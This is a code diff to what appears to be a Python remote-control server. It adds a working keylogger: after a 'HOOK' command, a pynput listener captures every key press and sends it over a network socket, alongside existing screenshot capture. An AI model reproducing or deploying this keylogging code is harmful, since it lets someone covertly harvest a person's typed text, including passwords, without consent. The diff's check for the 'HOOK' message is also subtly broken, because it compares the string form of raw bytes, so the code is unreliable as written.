@@ -4,14 +4,38 @@ from PIL import ImageGrab
 import io
 import os
 import tkinter as tk
+import threading
+from pynput import keyboard
 
 HOST = "127.0.0.1"
 PORT = 65431
 
-def send_keystroke(key):
-    # Add your implementation to send keystroke command here
-    print(f"Sending keystroke: {key}")
+#####################################################################
+# send keystroke
+def on_key_press(key, client_socket):
+    try:
+        client_text = str(key.char)
+    except AttributeError:
+        client_text = str(key)
 
+    client_socket.send(client_text.encode())
+
+def handle_client(client_socket):
+    isHook = False;
+    while (not isHook):
+        data = client_socket.recv(1024)
+        data = str(data)
+        if (data == "HOOK"):
+            isHook = True;
+    if (isHook):
+        with keyboard.Listener(on_press=lambda key: on_key_press(key, client_socket)) as listener:
+            listener.join()
+
+def send_keystroke(client_socket):
+    client_thread = threading.Thread(target=handle_client, args=(client_socket,))
+    client_thread.start()
+#####################################################################
+# Screenshot
 def take_screenshot(client_socket):
     print("Taking screenshot...")
     screenshot = pyautogui.screenshot()
@@ -33,12 +57,19 @@ def take_screenshot(client_socket):
     except OSError as e:
         print(f"Error deleting image: {e}")
 
+#####################################################################
+# Running Apps
 def app_running_check(app_name):
     print(f"Checking if {app_name} is running...")
 
+
+#####################################################################
+# Running Process
 def process_running_check(process_name):
     print(f"Checking if {process_name} is running...")
 
+#####################################################################
+# Shutdown
 def ShutDown(countdown_seconds=10):
     print("ShuttingDown")
     print(f"Initiating system shutdown in {countdown_seconds} seconds...")
@@ -69,6 +100,8 @@ def ShutDown(countdown_seconds=10):
     ShutDownRoot.after(1000, update_time)
     ShutDownRoot.mainloop()
 
+#####################################################################
+# Fix_Regsistry
 def fix_registry():
     print("Fixing the registry...")
     
@@ -76,7 +109,7 @@ def fix_registry():
 def handle_command(client_socket, command):
     parts = command.split()
     if parts[0] == "SendKeyStroke":
-        send_keystroke(parts[0])
+        send_keystroke(client_socket)
     elif parts[0] == "TakeScreenShot":
         take_screenshot(client_socket)
     elif parts[0] == "AppRunningChecking":
